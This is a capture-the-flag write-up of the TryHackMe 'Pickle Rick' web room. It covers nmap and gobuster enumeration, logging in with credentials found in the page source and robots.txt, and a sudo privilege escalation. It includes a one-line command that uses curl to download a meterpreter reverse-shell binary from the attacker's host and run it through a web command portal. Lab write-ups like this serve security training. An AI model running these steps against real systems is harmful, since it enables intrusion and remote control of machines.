---
layout: solution
category: TryHackMe
contest_code: Web_Hacking_Fundamentals
contest_name: Web Hacking Fundamentals
problem_code: PICKLE_RICK
problem_name: Pickle Rick
comments: false
tags: web
date: 2021-08-16
---

### First a nmap scan was conducted to determine the running services on the machine. Turns out it was running apache (web service) and SSH
```
nmap -sV -sC 10.10.11.43
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Pickle%20Rick/nmap.png)

‎


### The website was visited however, it turns out that nothing interesting was shown on the page until viewing the source code (inspect element) where we saw an username

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Pickle%20Rick/result1.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Pickle%20Rick/result2.png)

‎


### Gobuster was used to find hidden web pages within the website. Then we found out that, there were few intresting directories and pages. Some of them were visited (login.php & robots.php) where it reveal some text and also a login page
```
gobuster dir -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.11.43 -x php,html,txt
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Pickle%20Rick/gobuster.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Pickle%20Rick/login.png)

‎


### I attempted to sign in by using the username provided in the page source and trying the text found in robots.txt as the password which allowed me to gain entry to portal.php. This page allowed me to execute limited command on the machine

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Pickle%20Rick/code_injection1.png)

‎


### By executing the `ls` command, I am able to see the flag, however certain commands cannot be executed like `cat`, `more`, `less`, `ncat` thus a reverse meterpreter shell was obtained by creating one and hosting it on port 80. `curl` command was executed on the webpage to download the meterpreter reverse tcp file from my machine for execution
```
cd /tmp && curl -O 10.11.21.149/shell.elf && chmod 777 ./shell.elf && ./shell.elf
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Pickle%20Rick/create_shell.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Pickle%20Rick/code_injection2.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Pickle%20Rick/obtain_shell.png)

‎


### The following flags were found in the following locations

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Pickle%20Rick/flags1.png)

‎


### The last step was to perform privilege escalation to get access to flags in the the root directory. We first attempted to see the permission of www-data by executing `sudo -l`. turns out he can execute sudo command without password thus allowing us to escalate to root

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Pickle%20Rick/flags2.png)

